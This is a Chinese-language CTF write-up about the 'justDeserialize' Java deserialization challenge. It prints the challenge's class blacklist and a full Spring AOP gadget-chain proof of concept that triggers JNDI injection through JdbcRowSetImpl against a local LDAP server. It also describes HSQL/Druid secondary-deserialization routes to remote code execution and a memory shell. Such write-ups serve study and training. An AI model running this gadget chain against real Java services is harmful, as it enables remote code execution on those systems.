+++
date = '2025-03-24T22:00:00+08:00'
draft = false
title = '软件攻防赛现场赛上对justDeserialize攻击的几次尝试'
author='GSBP'
categories=["Java安全","WP"]

+++

## 前言

一个关于本地打通无数次但远程0次的故事

## 题目分析

题目直接给了一个反序列化的入口点

![image-20250324233735530](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250324233735530.png)

其中有两层防御

- 对我们的反序列化数据流中的明文进行简单判断过滤
- 使用了一个自定义反序列化类来对我们的反序列化数据流进行反序列化

其中自定义化反序列化类代码如下

```
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.ezjav.utils;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.ArrayList;

public class MyObjectInputStream extends ObjectInputStream {
    private String[] denyClasses;

    public MyObjectInputStream(ByteArrayInputStream var1) throws IOException {
        super(var1);
        ArrayList<String> classList = new ArrayList();
        InputStream file = MyObjectInputStream.class.getResourceAsStream("/blacklist.txt");
        BufferedReader var2 = new BufferedReader(new InputStreamReader(file));

        String var4;
        while((var4 = var2.readLine()) != null) {
            classList.add(var4.trim());
        }

        this.denyClasses = new String[classList.size()];
        classList.toArray(this.denyClasses);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();
        int var5 = this.denyClasses.length;

        for(int var6 = 0; var6 < var5; ++var6) {
            String denyClass = this.denyClasses[var6];
            if (className.startsWith(denyClass)) {
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }
        }

        return super.resolveClass(desc);
    }
}
```

从**blacklist**中读取baned类，且在`resolveClass`中进行过滤

blacklist.txt

```
javax.management.BadAttributeValueExpException
com.sun.org.apache.xpath.internal.objects.XString
java.rmi.MarshalledObject
java.rmi.activation.ActivationID
javax.swing.event.EventListenerList
java.rmi.server.RemoteObject
javax.swing.AbstractAction
javax.swing.text.DefaultFormatter
java.beans.EventHandler
java.net.Inet4Address
java.net.Inet6Address
java.net.InetAddress
java.net.InetSocketAddress
java.net.Socket
java.net.URL
java.net.URLStreamHandler
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
java.rmi.registry.Registry
java.rmi.RemoteObjectInvocationHandler
java.rmi.server.ObjID
java.lang.System
javax.management.remote.JMXServiceUR
javax.management.remote.rmi.RMIConnector
java.rmi.server.RemoteObject
java.rmi.server.RemoteRef
javax.swing.UIDefaults$TextAndMnemonicHashMap
java.rmi.server.UnicastRemoteObject
java.util.Base64
java.util.Comparator
java.util.HashMap
java.util.logging.FileHandler
java.security.SignedObject
javax.swing.UIDefaults
```

## 解决思考

### 第一步

对于第一层防御，我们可以很简单的绕过，对此我有以下两种绕过方式

- UTF8OverlongEncoding
- 不使用存在这些字符串的类(com.sun,naming,jdk.jfr)

这个很简单，就不多说了

第二层的resolveClass,我们只能选择不使用blacklist上面的类来达到攻击目的，经过我的排查，我手里刚好就有这么一段链子任何关键类都不在blacklist中，那就是springaop链

简单小引-> https://gsbp0.github.io/post/springaop/



在我上面的文章中，我最后是用的toString来触发aop动态代理的invoke方法，不过我在文章提到过,只要不是`equals,hashcode`这俩方法触发invoke,其他都是可以走完整条反序列化链

我在比赛过程中由题目中存在的User类的`compare`方法受到启发，选择了CC2和CB中都用到的`PriorityQueue`那一段来触发compare

下面是cb的部分poc

```
        BeanComparator CB=new BeanComparator();
        CB.setProperty("outputProperties");
        PriorityQueue PQ=new PriorityQueue(1);
        PQ.add(1);
        PQ.add(2);

        reflectSet(PQ,"comparator",CB);
        reflectSet(PQ,"queue",new Object[]{TPI,TPI});
```



ok，那直接拼到aop链的后面看看情况

结果触发了报错

```
Exception in thread "main" java.lang.IllegalArgumentException: Can not set final java.util.Comparator field java.util.PriorityQueue.comparator to com.sun.proxy.$Proxy3
	at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)
	at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)
	at sun.reflect.UnsafeQualifiedObjectFieldAccessorImpl.set(UnsafeQualifiedObjectFieldAccessorImpl.java:83)
	at java.lang.reflect.Field.set(Field.java:764)
	at Utils.Util.setFieldValue(Util.java:38)
	at Test.main(Test.java:30)
```

因为我们的proxy类没有实现`comparator`接口，那这里我们可以通过在外面**再次**包一层代理，且代理comparator接口即可

至于触发类，我们可以选择`LdapAttribute`这么一个jndi注入类，也可以选择`JdbcRowSetImpl`，不过需要utf8overlong麻烦一点

#### POC

```
import Utils.Util;
import com.sun.rowset.JdbcRowSetImpl;
import org.aopalliance.aop.Advice;
import org.aopalliance.intercept.MethodInterceptor;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.support.DefaultIntroductionAdvisor;

import java.lang.reflect.*;
import java.util.*;

public class Test {
    public static void main(String[] args) throws Exception {

        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/3fa0f4");
        Method method=jdbcRowSet.getClass().getMethod("getDatabaseMetaData");
        System.out.println(method);
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);
        AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);
        Proxy proxy1 = (Proxy) getAProxy(advice,Advice.class);
        Proxy finalproxy=(Proxy) getBProxy(proxy1,new Class[]{Comparator.class});
        PriorityQueue PQ=new PriorityQueue(1);
        PQ.add(1);
        PQ.add(2);

        Util.setFieldValue(PQ,"comparator",finalproxy);
        Util.setFieldValue(PQ,"queue",new Object[]{proxy1,proxy1});
        System.out.println(Util.serialize(PQ));
        Util.deserialize(Util.serialize(PQ));


    }
    public static Object getBProxy(Object obj,Class[] clazzs) throws Exception
    {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);
        return proxy;
    }
    public static Object getAProxy(Object obj,Class<?> clazz) throws Exception
    {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;

        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));
        advisedSupport.addAdvisor(advisor);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
        return proxy;
    }

}
```

### 第二步

#### 第一种方法-Ldap_SERIALIZE_DATA

家喻户晓的办法，因为题目jar包上的编译版本是11,还没有受到强制类隔离的要求，可以随便打`Jackson`那一套反序列化，或者是再走一边我们的AOP链但触发类换成可RCE的`TemplateImpl`类

这里我用的JNDIMap

![image-20250325000952223](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250325000952223.png)

![image-20250325000938383](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250325000938383.png)

ok本地成功RCE

但是放到远程直接失败GG，我开始思考我的问题

`ok可能是环境里设置了com.sun.jndi.ldap.object.trustSerialData为false，合理合理`

开始第二种方法

#### 第二种方法-hsql二次反序列化

Ok,我们这里直接看题目的依赖

![image-20250325001446186](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250325001446186.png)

`druid+hsql`，再加上题目名`justDeserialize`，指向性很明显了，我们打jndi_Reference触发`DruidDataSourceFactory`的getObjectInstance方法来打hsql-JDBC，触发hsql里的SerializationUtils二次反序列化实现RCE

这里我使用了[java-chains](https://github.com/vulhub/java-chains)

![image-20250325002100164](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250325002100164.png)

二次反序列化数据塞的我自己生成的AOP+springEcho内存马链子,这里也可以用这个工具自带的反序列化生成工具生成，也挺好用的

然后再打！

![image-20250325002221727](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250325002221727.png)

ok本地又通了,打远程！

那么问题再次来袭，我抱着满怀期待再去打远程的时候，又没通，直接道心崩溃了，后续不知道怎么打了，并且也没有题目环境，不知道啥问题qaq

## 结尾

不是很清楚这远程的环境，比赛的时候破大防，如果有师傅在比赛的时候打通了这道题希望能告诉我一下咋打的QAQ
